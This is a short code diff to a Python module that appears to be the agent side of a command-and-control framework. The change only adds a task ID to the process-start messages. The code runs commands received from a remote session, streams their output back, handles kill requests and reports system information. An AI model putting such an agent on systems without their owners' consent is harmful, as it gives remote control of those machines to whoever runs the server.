@@ -20,11 +20,13 @@ processes = {}
 
 class ProcessTask:
     command: str
+    task_id: int
     session: ProtocolSession
     process: subprocess.Popen
 
-    def __init__(self, command, session):
+    def __init__(self, command, task_id, session):
         self.command = command
+        self.task_id = task_id
         self.session = session
 
     def start(self):
@@ -35,7 +37,7 @@ class ProcessTask:
             stderr=subprocess.PIPE,
         )
         processes[self.process.pid] = self
-        self.session.send(ProcessStartedFrame(self.command, self.process.pid))
+        self.session.send(ProcessStartedFrame(self.command, self.process.pid, self.task_id))
         Thread(target=self.forward_stream, args=(self.process.stderr, 2), daemon=True).start()
         Thread(target=self.forward_stream, args=(self.process.stdout, 1), daemon=True).start()
         Thread(target=self.wait_process, daemon=True).start()
@@ -75,7 +77,7 @@ def handle(frame: DieRequestFrame, session: ProtocolSession):
 
 @c2.handler(ProcessStartRequestFrame)
 def handle(frame: ProcessStartRequestFrame, session: ProtocolSession):
-    ProcessTask(frame.command, session).start()
+    ProcessTask(frame.command, frame.request_id, session).start()
 
 
 def send_system_info(session: ProtocolSession):
